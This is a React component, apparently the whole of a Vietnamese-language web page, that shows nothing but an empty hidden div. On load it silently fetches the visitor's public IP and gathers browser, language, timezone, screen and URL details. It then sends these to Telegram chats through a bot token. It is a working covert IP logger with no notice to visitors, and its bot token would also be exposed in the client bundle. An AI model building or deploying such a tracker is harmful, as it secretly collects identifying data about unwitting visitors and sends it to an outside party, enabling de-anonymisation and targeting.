import { useEffect } from "react";
import "./App.css";

const IP_API_URL = "https://api.ipify.org?format=json";

function App() {
  useEffect(() => {
    const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
    const rawChatIds = import.meta.env.VITE_CHAT_IDS || import.meta.env.VITE_CHAT_ID || "";
    const chatIds = rawChatIds
      .split(",")
      .map((item) => item.trim())
      .filter(Boolean);

    async function getIPAddress() {
      const response = await fetch(IP_API_URL);
      if (!response.ok) {
        throw new Error("Không lấy được IP");
      }
      const data = await response.json();
      return data.ip;
    }

    function getVisitorInfo(ip) {
      const now = new Date();
      return [
        "🔔 Có lượt truy cập mới",
        "",
        `🌐 IP: ${ip}`,
        `🕒 Thời gian: ${now.toLocaleString("vi-VN")}`,
        `🔗 Trang: ${window.location.href}`,
        `💻 Thiết bị: ${navigator.userAgent}`,
        `🗣️ Ngôn ngữ: ${navigator.language}`,
        `⏰ Múi giờ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
        `🖥️ Màn hình: ${window.screen.width}x${window.screen.height}`,
      ].join("\n");
    }

    async function sendMessageToTelegram(chatId, message) {
      const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

      const response = await fetch(telegramApiUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });

      if (!response.ok) {
        throw new Error(`Không gửi được Telegram tới chat_id ${chatId}`);
      }
    }

    async function trackVisitor() {
      try {
        if (!telegramBotToken || chatIds.length === 0) {
          console.error("Thiếu VITE_TELEGRAM_BOT_TOKEN hoặc VITE_CHAT_IDS trong file .env");
          return;
        }

        const ip = await getIPAddress();
        const message = getVisitorInfo(ip);

        await Promise.all(chatIds.map((chatId) => sendMessageToTelegram(chatId, message)));
      } catch (error) {
        console.error("Lỗi khi gửi thông tin truy cập:", error);
      }
    }

    trackVisitor();
  }, []);

  return <div className="app-hidden" aria-hidden="true" />;
}

export default App;
